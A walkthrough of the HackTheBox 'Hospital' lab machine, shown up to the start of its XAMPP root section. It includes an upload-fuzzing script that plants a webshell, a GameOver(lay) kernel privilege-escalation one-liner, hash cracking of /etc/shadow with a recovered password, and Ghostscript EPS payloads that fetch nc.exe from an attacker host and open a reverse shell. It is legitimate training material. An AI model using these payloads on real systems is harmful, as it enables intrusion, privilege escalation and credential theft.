Hospital is a medium-level challenge on HackTheBox, that covers a diverse range of exploitation techniques. Beginning with the discovery of a file upload vulnerability, leading to the exploitation of a privilege escalation flaw on a Linux server using 'unshare' [CVE-2023-2640 & CVE-2023-32629 GameOver(lay)]. Continuing with the creation of a malicious EPS file to exploit a command injection vulnerability in Ghostscript to get access to a Windows machine[CVE-2023-36664]. Additionally, finding various paths for achieving administrative access, such as exploiting misconfigurations in XAMPP by uploading an administrative webshell, and uncovering plaintext credentials via RDP.

## Enumeration
Beginning with an initial Nmap scan targeting all ports using TCP  SYN scan at a rate of minimum 5000 packets per second. The scan results are saved to a file named 'allPorts' in 'grep' format, facilitating the extraction of discovered ports. Afterwards, an exhaustive scan is conducted on each identified port using a more direct approach


```bash
sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.11.241 -oG allPorts -vvv
```

An exhaustive Nmap scan is conducted on the identified ports to determine their respective versions and to search for potential exploit scripts. This approach optimizes resource usage by first identifying the open ports extracted from the previously saved 'grep' format file before initiating targeted scans for version detection and exploit potential.

```bash
sudo nmap -sVC -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6615,6631,6643,8080,9389 --min-rate=5000 -n -Pn 10.10.11.241 -oN targeted

The hostname 'hospital.htb' was added to the '/etc/hosts' file for ease of reference. While not strictly necessary as the machine did not utilize subdomains, this action was taken to maintain brevity and clarity in the subsequent steps of the process.

```bash
echo "10.10.11.241 hospital.htb" | sudo tee -a /etc/hosts
```

After successful login, the website at http://hospital.htb:8080/index.php presents the option to upload files to the server.

![upload button](/assets/img/htb/hospital/homepage_upload.png)

## File upload exploit 

After capturing and analyzing the request, it becomes apparent that the server has a file upload vulnerability related to the file extension.

![request from upload.php](/assets/img/htb/hospital/request_1.png)

A custom script was made to automate the task of fuzzing extensions on post requests directed at the 'upload.php' of the target machine, using a custom wordlist with the php extensions from [hacktricks file upload page](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology.). The script facilitates the automated upload of a webshell to the server, facilitating the process of identifying valid extensions and exploiting the vulnerability.

```bash
## Define the URL
url = 'http://hospital.htb:8080/upload.php'

## Define the headers
headers = {
    'Referer': 'http://hospital.htb:8080/index.php',
    'Cookie': 'PHPSESSID=k1ajocskfrc83hru642ag5p9nc',
    'Connection': 'close'
}

def fuzz_upload(wordlist,webshell,fname):
    #upload shell

    with open(webshell,'r') as file:
        shell_data = file.read()

    with open(wordlist,"r") as my_wordlist:
        for line in my_wordlist:
            ext=line.strip()
            files = {
                'image': (f'{fname}.{ext}', shell_data, 'image/jpeg')
            }

            response = requests.post(url, headers=headers, files=files)
            #print(response.text)

            if not "Error" in response.text:
                print(f"[+] Uploaded {fname}.{ext}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="upload fuzzing extension tool")
    parser.add_argument("-w", "--wordlist", required=True, help="File containing extensions")
    parser.add_argument("-x", "--webshell", required=True, help="File containing webshell")
    parser.add_argument("-f", "--filename", required=False, default="file", help="filename to use, default 'file' without the extention")
    args = parser.parse_args()

    fuzz_upload(args.wordlist,args.webshell,args.filename)
```

The script is used to upload the [p0wny-shell](https://github.com/flozz/p0wny-shell) while finding valid extensions at the same time.

![uploading p0wny](/assets/img/htb/hospital/uploading_p0wny.png)

After successfully uploading the files, the fuzzing process began to find their storage location using ffuf. The point of interest was the 'uploads' folder, where files were found to be stored with identical names as those used during the upload process. Despite the absence of directory listing functionality in /uploads, the files within the 'uploads' directory retained their original filenames, facilitating their retrieval and exploitation.

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://hospital.htb:8080/FUZZ -o hospital_htb_8080_FUZZ.out -t 15
```

![fuzzing uploads](/assets/img/htb/hospital/ffuf_uploads.png)

## Shell on Linux Server 

The webshell is discovered at http://hospital.htb:8080/uploads/myfile.phar, where the '.phar' extension was identified as the one capable of executing php code among various other extensions attempted.

![p0wny shell on linux server](/assets/img/htb/hospital/p0wny_shell_1.png)

Gaining access to the Linux server that hosts http://hospital.htb:8080.

For a stable shell do:

- nc -lnvp 443

- script /dev/null -c bash

- (ctrl+z)

- stty raw -echo ; fg

- reset xterm (then press enter)

- export TERM=xterm

- export SHELL=bash

Upon reviewing the 'ifconfig' output, it is determined that the attacker is located within a separate network, as indicated by the 'eth0 inet' IP address.

![ifconfig output](/assets/img/htb/hospital/ifconfig_ouptut_1.png)

## Privesc on Linux Server 
Further enumeration shows that the Linux machine is vulnerable to CVE-2023-32629 & CVE-2023-2640 privilege escalation exploits based on the machine kernel which is 5.19.0-35-generic Ubuntu, the exploit works in a path where www-data can read and write.

poc.sh 
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
![privesc on LS](/assets/img/htb/hospital/privesc_linux_server_2.png)

Upon achieving root access, the /etc/shadow file is accessible, allowing for the extraction of hashes for cracking attempts.

![reading /etc/shadow](/assets/img/htb/hospital/reading_shadow.png)

Using hashcat, the password for 'drwilliams' is successfully cracked. `qwe123!@#`

```bash
hashcat -a 0 -m 1800 drwilliams_hash /usr/share/wordlists/rockyou.txt
```
## Access to the Windows server

The credentials obtained of drwilliams work for the https://hospital.htb webmail.

![drwilliams webmail](/assets/img/htb/hospital/drwilliams_webmail_1.png)

An email originating from drbrown@hospital.htb instructs drwilliams to send an .eps file intended for visualization with Ghostscript.

![email from drbrown](/assets/img/htb/hospital/email_from_drbrown_1.png)

A vulnerability in Ghostscript, identified as CVE-2023-36664, enables command injection upon opening a PS or EPS file, potentially resulting in code execution.

Use the [GhostScript Command Injection POC](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) to create a malicious EPS file and gain a reverse shell.

The first step is injecting code that will download nc.exe from the attacker server.

```bash
python CVE_023_36664_exploit.py --inject --payload 'curl 10.10.14.26/nc.exe' --filename file.eps
```

![running the payload](/assets/img/htb/hospital/curl_nc_ghostscript.png)

Access the compose function, attach the malicious .eps file, set the recipient as Drbrown, and proceed to send the email.

![composing email](/assets/img/htb/hospital/composing_email_1.png)

The attacker's machine receives a GET request, confirming the success of the code injection. Afterwards, nc.exe is now present on the victim machine.

![received "get" hit](/assets/img/htb/hospital/get_hit_1.png)

The attacker proceeds to create and send another malicious .eps file, this time the code injection will tell the victim machine to execute nc.exe and send a reverse shell to the attacker's machine.

```bash
python CVE_023_36664_exploit.py --inject --payload 'nc.exe -e cmd 10.10.14.26 9001' --filename file.eps
```
![ghostscript reverse shell injection](/assets/img/htb/hospital/ghostscript_reverse_shell.png)

![composing another email](/assets/img/htb/hospital/composing_email_2.png)

A reverse shell connection is established, granting the attacker access to the victim machine.

![ps shell received](/assets/img/htb/hospital/recv_ps_shell_1.png)

The user flag is at __C:\Users\drbrown.HOSPITAL\Desktop__

![shell as drbrown](/assets/img/htb/hospital/whoami_drbrown_1.png)

## Root 
 
### solution 1 (XAMPP misconfiguration)
